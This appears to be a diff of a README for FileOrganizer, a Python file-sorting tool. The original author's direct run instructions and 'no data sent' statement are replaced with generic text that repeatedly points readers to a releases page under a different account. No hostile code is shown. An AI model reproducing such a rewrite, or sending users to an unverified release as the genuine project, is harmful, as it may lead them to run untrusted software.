@@ -1,54 +1,102 @@
-## FileOrganizer
-FileOrganizer is a fast, cross-platform command-line tool that organizes files in any folder by type. It groups files into predefined categories such as Videos, Music, Images, Documents, Archives, Executables, and Scripts.  
+# 📂 FileOrganizer - Simplify Your File Management Today!
 
-It handles all file extensions, resolves name conflicts automatically, and provides a color-coded summary at the end of the process.
+[![Download FileOrganizer](https://img.shields.io/badge/Download-FileOrganizer-brightgreen.svg)](https://github.com/xwyuan-sg/FileOrganizer/releases)
 
----
+## 📖 What is FileOrganizer?
 
-## ✨ Features
+FileOrganizer is a fast Python CLI tool that automatically organizes files in any folder by type. It sorts files into categories like Videos, Music, Images, Documents, Archives, Executables, and Scripts. With FileOrganizer, you can keep your storage neat and efficient without the hassle of manual sorting. It handles all file extensions, resolves name conflicts, and presents you with a clear, color-coded summary after each operation. Plus, you have the option to support the project with donations.
 
-- Recursive folder scanning  
-- Organizes files by type (Videos, Music, Images, Documents, Archives, Executables, Scripts, Others)  
-- Handles all extensions and unknown file types  
-- Automatically resolves name collisions  
-- Color-coded output:  
-  - 🟢 Green: organization complete  
-  - 🔵 Blue: donation message  
-- Human-readable summary of files organized  
-- Cross-platform: Windows, Linux, macOS  
-- No ads, no tracking, no data sent anywhere  
+## 🚀 Getting Started
 
-<img width="1571" height="317" alt="FileOrganizer" src="https://github.com/user-attachments/assets/ca233b65-b733-4cb0-a39c-321e516b1b8e" />
+### ▶️ System Requirements
 
----
+To run FileOrganizer, you will need:
 
-## 🛠️ Technology
+- A computer running Windows, macOS, or Linux.
+- Python 3.6 or higher installed on your system.
+- Basic command-line knowledge (instructions provided below).
 
-- **Language:** Python 3  
-- **Libraries:** Python Standard Library only: `os`, `shutil`, `argparse`, `pathlib`, `sys`  
-- No external dependencies required  
+### 📥 Download & Install
 
----
+To get started, you need to download FileOrganizer. Click below:
 
-## 🚀 How to use
+[Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/releases)
 
-### Requirements
+1. Visit the [Releases page](https://github.com/xwyuan-sg/FileOrganizer/releases).
+2. Look for the latest version.
+3. Download the appropriate file for your operating system.
+4. Follow the installation instructions specific to your OS.
 
-- Python 3.8 or newer
+## 📜 How to Run FileOrganizer
 
-### Basic command
+Once you have installed the application, follow these steps to run FileOrganizer:
 
-```bash
-python FileOrganizer.py group "C:\\Path\\To\\Folder"
-```
+1. **Open Command Line Interface:**
+   - On Windows, search for "Command Prompt" in the Start menu.
+   - On macOS, open "Terminal" from Applications > Utilities.
+   - On Linux, search for “Terminal” in your applications.
 
-This command will scan the folder and move all files into their respective categories, creating folders if they do not exist.
+2. **Navigate to the Folder:**
+   Use the `cd` command to change to the directory where your files are stored. For example:
 
-## 🔒 Why this tool is safe
-FileOrganizer only reads and moves files locally on your system. It does not send any data to external servers.
-All operations are performed in-place, and name collisions are handled automatically to prevent overwriting.
+   ```
+   cd path/to/your/folder
+   ```
 
-## ❤️ Support the project
-If you enjoy this project and want to support development, you can make a donation here: https://www.paypal.com/paypalme/EnricoArama
+   Replace `path/to/your/folder` with the actual path.
 
+3. **Run FileOrganizer:**
+   Execute the following command:
 
+   ```
+   python fileorganizer.py
+   ```
+
+   Ensure you replace `fileorganizer.py` with the correct name of the downloaded file if it is different.
+
+4. **Select File Types:**
+   Follow the prompts on the screen to choose the types of files you wish to organize.
+
+5. **View the Summary:**
+   After sorting, you will see a color-coded summary of what was organized and where.
+
+## 🗂️ Features
+
+- **Auto-Sorting:** Automatically sorts files into designated folders based on type.
+- **Conflict Resolution:** Handles name conflicts efficiently.
+- **Detailed Summary:** Offers a clear summary of actions taken.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+- **Open-Source:** Community-supported with an option to contribute via donations.
+
+## ❓ Frequently Asked Questions
+
+### Q: Is FileOrganizer safe to use?
+
+A: Yes, FileOrganizer is open-source, which means anyone can review the code. This enhances transparency and safety.
+
+### Q: What file types can FileOrganizer handle?
+
+A: FileOrganizer can organize any file type, including but not limited to videos, music, images, documents, archives, executables, and scripts.
+
+### Q: Can I use FileOrganizer on mobile devices?
+
+A: Currently, FileOrganizer is designed for desktop environments. Mobile compatibility is not available at this time.
+
+## 💬 Support
+
+If you encounter issues or have questions, you can open an issue on the [GitHub issues page](https://github.com/xwyuan-sg/FileOrganizer/issues). 
+
+## 🙏 Donations
+
+If you find FileOrganizer helpful and want to support its continued development, you can also make a donation. Check the project page for details.
+
+## 🌐 Stay Updated
+
+To stay informed about updates, enhancements, and new features, follow the repository on GitHub. 
+
+### 💡 Additional Resources
+
+- [Python Official Site](https://www.python.org/)
+- [Command Line Basics](https://www.codecademy.com/articles/command-line-101)
+
+[Download FileOrganizer](https://github.com/xwyuan-sg/FileOrganizer/releases) and make your file management easy and stress-free!
